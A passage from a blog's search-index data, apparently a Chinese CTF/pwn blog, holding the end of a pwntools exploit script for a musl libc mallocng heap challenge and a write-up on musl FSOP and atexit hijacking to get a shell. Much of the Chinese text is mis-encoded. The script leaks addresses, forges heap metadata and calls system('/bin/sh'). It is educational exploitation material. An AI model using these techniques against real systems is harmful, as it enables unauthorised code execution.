&quot;) if key_size == None : key_size = len(key) p.sendline(str(key_size).encode()) p.recvuntil(b&quot;content: &quot;) p.send(key)def delete(key, key_size=None): p.recvuntil(b&quot;option: &quot;) p.sendline(b&quot;3&quot;) p.recvuntil(b&quot;size: &quot;) if key_size == None : key_size = len(key) p.sendline(str(key_size).encode()) p.recvuntil(b&quot;content: &quot;) p.send(key)def exit(): p.recvuntil(b&quot;option: &quot;) p.sendline(b&quot;4&quot;) def calc(key): vi = 2021 for i in range(len(key)): vi = 0x13377331 * vi + key[i] return vi &amp; 0xfffdef find_key(key=b&quot;hhhh&quot;, size=4): while True: new_key = (int((random.random()) * int((b&quot;\\xff&quot; * size).hex(), 16)) % int((b&quot;\\xff&quot; * size).hex(), 16)) if calc(key) == calc(new_key.to_bytes(size, &quot;little&quot;)) : return new_key.to_bytes(size, &quot;little&quot;)def fengshui1(n): for _ in range(n): store(b&quot;victim&quot;, b&quot;victim&quot;)def fengshui2(n): for _ in range(n): query(b&quot;h&quot; * 0x30)def get_leak(): info = b&quot;&quot; for i in range(8): info = p.recv(2) + info return int(info, 16)# -- leak info --fengshui1(1)fengshui2(5) # AFFFFFU# leak elf &amp; libcstore(b&quot;hhhh&quot;, b&quot;a&quot; * 0x30) # [U]AAAA(U)U [U] is KV, (U) is KV-&gt;valuestore(find_key(), b&quot;aaaa&quot;)delete(b&quot;hhhh&quot;) # [F]AAAUFUfengshui2(3) # FFFFUFUstore(b&quot;H\\n&quot;, b&quot;H&quot;, 0x1000) # AAAAU[U]U [U] is the chunk we can getquery(b&quot;hhhh&quot;)p.recvuntil(b&quot;:&quot;)addr_mmap = get_leak() - 0x20addr_libc = addr_mmap + 0x4000addr_malloc_context = addr_libc + 0xad9c0addr_elf = get_leak() - 0xc8d0addr_hhhh = addr_elf + 0xc890addr_KV = addr_elf + 0xcde0 # leak secretdelete(b&quot;H&quot;) # AAAAUFUfengshui2(2) # AAFFUFUKV = p64(addr_hhhh) + p64(addr_malloc_context) + p64(4) + p64(0x30) + p64(0x69052445) + p64(0)store(KV, b&quot;victim&quot;) # UUFFUFUquery(b&quot;hhhh&quot;)p.recvuntil(b&quot;:&quot;)secret = get_leak()get_leak()addr_heap = get_leak() - 0x180success(&quot;addr_elf: &quot; + hex(addr_elf))success(&quot;addr_mmap: &quot; + hex(addr_mmap))success(&quot;addr_libc: &quot; + hex(addr_libc))success(&quot;secret: &quot; + hex(secret))# -- construct --delete(KV) # FFAAUFUaddr_system = addr_libc + libc.sym[&quot;system&quot;]addr_ofl_head = addr_libc + 0xafd48addr_fake_meta_area = addr_mmap + 0x1000addr_fake_meta = addr_fake_meta_area + 0x18addr_fake_group = addr_fake_meta + 0x28addr_fake_chunk = addr_fake_group + 0x10last_idx = 0freeable = 1sc = 8 # 0x90maplen = 1fake_meta = p64(addr_fake_chunk) # prevfake_meta += p64(addr_ofl_head) # next fake_meta += p64(addr_fake_group) # memfake_meta += p64(0) # avail &amp; freed maskfake_meta += p64(last_idx | freeable &lt;&lt; 5 | sc &lt;&lt; 6 | maplen &lt;&lt; 12)active_idx = 0fake_group = p64(addr_fake_meta)fake_group += p64(active_idx)fake_chunk = b&quot;/bin/sh\\x00&quot;fake_chunk += p64(0) * 7fake_chunk += p64(addr_system) * 7fake_meta_area = b&quot;h&quot; * 0xfd0fake_meta_area += p64(secret) # checkfake_meta_area += p64(0) # nextfake_meta_area += p64(1)payload = fake_meta_areapayload += fake_metapayload += fake_grouppayload += fake_chunkpayload += b&quot;\\n&quot;store(payload, b&quot;victim&quot;, 0x1200) # FFAUUFUstore(b&quot;victim&quot;, b&quot;hhhh&quot;)fengshui2(1) # AAUUUFUaddr_hhhh = addr_hhhh + 0xb0KV = p64(addr_hhhh) + p64(addr_fake_chunk) + p64(4) + p64(0x80) + p64(0x69052445) + p64(0)store(KV, b&quot;victim&quot;)gdb.attach(p)delete(b&quot;hhhh&quot;)exit()p.interactive() å‚è€ƒmusl libc å †ç®¡ç†å™¨ mallocng è¯¦è§£ (Part I) ä»musl libc 1.1.24åˆ°1.2.2 å­¦ä¹ pwnå§¿åŠ¿ [é˜…è¯»å‹]æ–°ç‰ˆmusl libc(1.2.2)å †ç®¡ç†ä¹‹æºç å‰–æï¼ [åŸåˆ›]musl 1.2.2 æ€»ç»“+æºç åˆ†æ One æ–°ç‰ˆmusl libc æµ…æ 2022-å¼ºç½‘æ¯åˆèµ›-Writeup-By-Xp0int å€ŸåŠ©DefCon Quals 2021çš„moooslå­¦ä¹ musl mallocng","link":"/2022/10/10/Musl%20heap%20%E6%B5%85%E6%9E%90/"},{"title":"Musl libc Exploration","text":"æŒç»­æ›´æ–°ï¼ˆæˆ–è®¸ï¼‰ ç¯å¢ƒï¼šx64 musl-1.2.2 FSOPFILE ç»“æ„./src/internal/stdio_impl.h12345678910111213141516171819202122232425262728struct _IO_FILE { unsigned flags; unsigned char *rpos, *rend; int (*close)(FILE *); unsigned char *wend, *wpos; unsigned char *mustbezero_1; unsigned char *wbase; size_t (*read)(FILE *, unsigned char *, size_t); size_t (*write)(FILE *, const unsigned char *, size_t); off_t (*seek)(FILE *, off_t, int); unsigned char *buf; size_t buf_size; FILE *prev, *next; int fd; int pipe_pid; long lockcount; int mode; volatile int lock; int lbf; void *cookie; off_t off; char *getln_buf; void *mustbezero_2; unsigned char *shend; off_t shlim, shcnt; FILE *prev_locked, *next_locked; struct __locale_struct *locale;}; ç›¸æ¯” glibc çš„ FILE ç»“æ„ï¼Œmusl libc çš„ FILE ç»“æ„æ›´åŠ ç®€å•ï¼Œä¹Ÿæ›´å®¹æ˜“åˆ©ç”¨ æœ‰å››ç±» FILE æŒ‡é’ˆï¼šofl_headã€stdinã€stdoutã€stderr ofl_head ç±»ä¼¼ glibc çš„ _IO_list_allï¼Œæ‰“å¼€çš„æ–‡ä»¶é“¾è¡¨å¤´ï¼Œä¸ºå…¨å±€å˜é‡ å¯ä»¥ç›´æ¥åŠ«æŒåˆ°ä¼ªé€ çš„ FILE ç»“æ„ stdinã€stdoutã€stderr å›ºå®šçš„ä¸‰ä¸ª FILE æŒ‡é’ˆï¼Œä¸å¯åŠ«æŒ å¯ä»¥æ›´æ”¹å…¶æŒ‡å‘çš„å†…å­˜ç©ºé—´ åˆ©ç”¨./src/stdio/__stdio_exit.c12345678910111213141516static void close_file(FILE *f){ if (!f) return; FFINALLOCK(f); if (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0); if (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);}void __stdio_exit(void){ FILE *f; for (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f); close_file(__stdin_used); close_file(__stdout_used); close_file(__stderr_used);} åœ¨ exit() æ—¶ä¼šè°ƒç”¨ __stdio_exit() ï¼Œå…¶ä¸­ close_file() ä¼šè°ƒç”¨ FILE çš„ä¸¤ä¸ªå‡½æ•° write å’Œ seek FSOP æ¡ä»¶ f-&gt;lock == 0 ä¸ä¸º 0 ä¼šè°ƒç”¨ futex ç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åå¯„äº† flags == â€œ/bin/sh\\x00â€ è°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°éƒ½æ˜¯ FILE æŒ‡é’ˆï¼Œåœ¨åŠ«æŒä¸º system æ—¶ï¼Œå°† flags æ”¹ä¸º /bin/sh\\x00 å³å¯ è°ƒç”¨ write wpo != wbase è°ƒç”¨ seek rpos != rend exit hijackğŸ§å¸ˆå‚…æåŠçš„ ç¬”è€…è‡ªå·±èµ·çš„åï¼ˆ ./src/exit/atexit.c12345678910111213141516171819202122232425#define COUNT 32static struct fl{ struct fl *next; void (*f[COUNT])(void *); void *a[COUNT];} builtin, *head;static int slot;static volatile int lock[1];volatile int *const __atexit_lockptr = lock;void __funcs_on_exit(){ void (*func)(void *), *arg; LOCK(lock); for (; head; head=head-&gt;next, slot=COUNT) while(slot--&gt;0) { func = head-&gt;f[slot]; arg = head-&gt;a[slot]; UNLOCK(lock); func(arg); LOCK(lock); }} åœ¨ exit() æ—¶ï¼Œä¼šè°ƒç”¨ __funs_on_exit() é€šè¿‡ head æŒ‡é’ˆæ‰§è¡Œæ³¨å†Œçš„ç»ˆæ­¢å‡½æ•° åˆ©ç”¨æ¡ä»¶ å°† head åŠ«æŒåˆ°å¯æ§å†…å­˜ç©ºé—´ ç¬¬ä¸€ä¸ªå¾ªç¯å› ä¸º slot == 0ï¼Œä¼šç›´æ¥è·³è¿‡ ä»è€Œ head = head-&gt;next *(head-&gt;next + 0x100) == addr_system *(head-&gt;next + 0x200) == addr_binsh åœ¨ç†æƒ³çš„å †é£æ°´æƒ…å†µä¸‹ï¼Œåªéœ€è¦ä»»æ„å†™ä¸€æ¬¡ï¼Œå³å¯é€šè¿‡ exit() æ‹¿åˆ° shell","link":"/2022/10/11/Musl%20libc%20Exploration/"}],"tags":[{"name":"Operating System","slug":"Operating-System","link":"/tags/Operating-System/"},{"name":"Pwn","slug":"Pwn","link":"/tags/Pwn/"}],"categories":[{"name":"Course","slug":"Course","link":"/categories/Course/"},{"name":"MIT 6.1810 2022Fall","slug":"Course/MIT-6-1810-2022Fall","link":"/categories/Course/MIT-6-1810-2022Fall/"},{"name":"Computer Science","slug":"Computer-Science","link":"/categories/Computer-Science/"},{"name":"Exploration","slug":"Exploration","link":"/categories/Exploration/"}],"pages":[{"title":"","text":"{\"Scardow\":{\"url\":\"https://scardow.cn\",\"img\":\"https://scardow.github.io/blob/main/images/images.png\",\"text\":\"ç«ä¹å¤§ä½¬\"},\"Asiv\":{\"url\":\"https://niceasiv.cn\",\"img\":\"https://niceasiv.cn/sysimg/head.jpg\",\"text\":\"æˆ‘æ»´é˜¿è¥¿ï¼\"},\"Wings\":{\"url\":\"https://blog.wingszeng.top\",\"img\":\"https://blog.wingszeng.top/img/avatar.gif\",\"text\":\"å·¨ä½¬è€ä¹¡ Wings gg\"},\"Arttnba3\":{\"url\":\"https://arttnba3.cn\",\"img\":\"https://arttnba3.cn/img/avatars/avatar.png\",\"text\":\"Pwner, kernelã®ç¥\"},\"Eqqie\":{\"url\":\"https://\",\"img\":\"https://eqqie.cn/usr/uploads/2021/08/1035745416.jpg\",\"text\":\"Pwner, å…¨æ ˆã®ç¥\"}}","link":"/links.json"},{"title":"","text":"{\"Scardow\":{\"url\":\"https://scardow.cn\",\"img\":\"https://github.com/Scardow/scardow.github.io/blob/main/images/images.png\",\"text\":\"ç«ä¹å¤§ä½¬\"},\"Asiv\":{\"url\":\"https://niceasiv.cn\",\"img\":\"https://niceasiv.cn/sysimg/head.jpg\",\"text\":\"æˆ‘æ»´é˜¿è¥¿ï¼\"},\"Wings\":{\"url\":\"https://blog.wingszeng.top\",\"img\":\"https://blog.wingszeng.top/img/avatar.gif\",\"text\":\"å·¨ä½¬è€ä¹¡ Wings gg\"},\"Arttnba3\":{\"url\":\"https://arttnba3.cn\",\"img\":\"https://arttnba3.cn/img/avatars/avatar.png\",\"text\":\"Pwner, kernelã®ç¥\"},\"Eqqie\":{\"url\":\"https://\",\"img\":\"https://eqqie.cn/usr/uploads/2021/08/1035745416.jpg\",\"text\":\"Pwner, å…¨æ ˆã®ç¥\"}}","link":"/links.json"},{"title":"","text":"æ¬¢è¿æ¥åˆ°æˆ‘çš„åšå®¢è¿™æ˜¯æˆ‘æ­å»ºçš„ç¬¬ä¸€ä¸ªåšå®¢ï¼ŒåŠŸèƒ½è¿˜ä¸å®Œå…¨ï¼Œæˆ‘ä¼šé™†ç»­æ›´æ–°ã€å®Œå–„å®ƒï¼ˆå°½é‡ä¸å’•ï¼‰ è‡ªæˆ‘ä»‹ç»Humoooor 20 å² æ‡’äººä¸€ä¸ª ç›®å‰å°±è¯»äºè¥¿å®‰æŸé«˜æ ¡ è¿™ä¸ªåšå®¢çš„ä½œç”¨è®°å½•æˆ‘çš„æŠ€æœ¯å­¦ä¹ ã€æ—¥å¸¸ç”Ÿæ´» å¯¹æˆ‘çš„æ–‡ç« æœ‰æƒ³æ³•ï¼Œæˆ–è€…æƒ³å’Œæˆ‘äº¤æµå¯ä»¥åœ¨æ–‡ç« ä¸‹é¢è¯„è®ºï¼Œæˆ–è€…ç»™æˆ‘å‘é‚®ä»¶ï¼ˆå¯èƒ½ä¸ä¼šé‚£ä¹ˆåŠæ—¶å›å¤ï¼‰ æƒ³è¦åŠæ—¶è”ç³»çš„è¯ï¼Œæ¬¢è¿è”ç³»ä¾§è¾¹æ çš„é‚®ç®±ä¸æˆ‘æ·±å…¥â™‚äº¤æµã€‚ åŒæ—¶ä¹Ÿæ¬¢è¿äº¤æ¢å‹é“¾QAQ","link":"/about/index.html"},{"title":"Friends","text":"Scardowï¼šPwner ç«ä¹ï¼ Wingsï¼šå·¨ä½¬è€ä¹¡ï¼ŒWings gg Asivï¼šæˆ‘æ»´é˜¿è¥¿ï¼ Arttnba3ï¼šPwner å†…æ ¸ã®ç¥ Eqqieï¼šPwner å…¨æ ˆã®ç¥","link":"/friends/index.html"}]}